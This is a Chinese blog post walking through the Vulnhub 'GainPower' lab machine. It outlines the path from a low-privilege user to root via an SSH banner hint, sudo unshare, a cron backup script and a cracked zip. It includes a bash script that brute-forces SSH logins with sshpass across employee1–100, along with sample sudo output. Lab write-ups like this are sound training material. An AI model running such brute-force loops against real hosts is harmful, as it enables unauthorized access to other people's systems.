---
layout: post
title: "GainPower靶场渗透历程"
date: 2020-12-02
author: Bin4xin
toc: true
categories:
    - blog
    - Vulnhub
    - 笔记
permalink: /blog/GainPower/walkthrough/
---

- employee1:ssh banner发现问题；
    - 根据提示获得低权限shell
- employee64:考验脚本编写能力（ssh爆破）
    - bash脚本批量连接

- programmer:获取sudo shell
    - 通过unshare切换到sudo用户
    - `$ su - employee64`
    - `$ sudo -u programmer unshare`
- vanshal:crontab计划获取shell
    - pspy tool to detected
    - /media/programmer/scripts/backup.sh
- root:secert zip file
    - zip password crack
    - login ajenti to run root shell.

写个脚本来批量跑试试看：
```
#!/bin/bash

pwn () {
  read -p 'target ip: ' ip
  sleep 2
  for data in {1..100}
  do
      echo 'Try: ' $data
      sshpass -p 'employee'$data ssh employee$data@$ip 'echo employee'$data' | sudo -S -l'
      printf "\n"
  done
}

pwn
```
for一下用户名密码{employee+$data}in{1..100}，使用sshpass进行批量ssh连接认证，并尝试`sudo`;
失败如下：
```
[sudo] employee100 的密码：对不起，用户 employee100 不能在 localhost 上运行 sudo。
```
成功：
```
[sudo] employee64 的密码：匹配 %2$s 上 %1$s 的默认条目：
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

用户 employee64 可以在 localhost 上运行以下命令：
    (programmer) /usr/bin/unshare
```
所以用户employee64是拥有sudo权限；




